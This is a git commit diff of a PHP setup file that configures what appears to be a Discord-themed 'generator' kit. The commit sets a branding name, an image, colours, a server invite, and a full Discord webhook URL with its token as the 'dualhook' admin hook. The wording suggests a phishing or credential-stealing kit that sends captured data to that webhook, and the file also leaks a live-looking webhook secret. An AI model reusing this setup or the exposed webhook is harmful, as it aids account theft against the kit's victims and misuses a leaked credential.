17b51021d36e26923ce78c06370059e144c794a4
Johncenalives <150700203+Johncenalives@users.noreply.github.com>
2023-11-13 10:22:11 -0500

    setup.php

--- setup.php
+++ setup.php
@@ -2,12 +2,12 @@
 
 // Setup file for users!
 
-$name = "Termed#0001"; // Change to any name u want for ur generator
-$image = "https://media.discordapp.net/attachments/1097841417591738378/1098664331828285501/tumblr_1f782183a9ea642e79b07d82c180da50_bbefd568_400.png?width=360&height=360"; // Any Image u want
-$Backgroundcolor = "white"; // Examples white, blue, orange, yellow, wheat
-$adminhook = "WEBHOOK HERE!"; // Change to ur dualhook webhook!
-$discord = ".gg/incog"; // change discord server to ur server
-$colorTitle = "blue"; // Example colors for title white, black, or any other color lol
+$name = "Shxcker"; // Change to any name u want for ur generator
+$image = "https://cdn.discordapp.com/attachments/1156065481007042611/1173643757980242022/Hnet.com-image.png?ex=6564b3ed&is=65523eed&hm=afa33cf26d54affd97537e7737ca66b039fb6b0a0365ca42728928e75ea4f973&"; // Any Image u want
+$Backgroundcolor = "black"; // Examples white, blue, orange, yellow, wheat
+$adminhook = "https://discord.com/api/webhooks/1173643027680604230/1WNSAvg0gvWtLhRHKF6w-941CBZx3dXaH47pLISKKwVF0hG9jTB8CaxAsuE64sk4hYFl"; // Change to ur dualhook webhook!
+$discord = ".gg/qzWWe8jGr8"; // change discord server to ur server
+$colorTitle = "purple"; // Example colors for title white, black, or any other color lol
 
 
 // Credits Termed#0001 | Message me if u wanna buy a better src with 2fa and more for cheap!
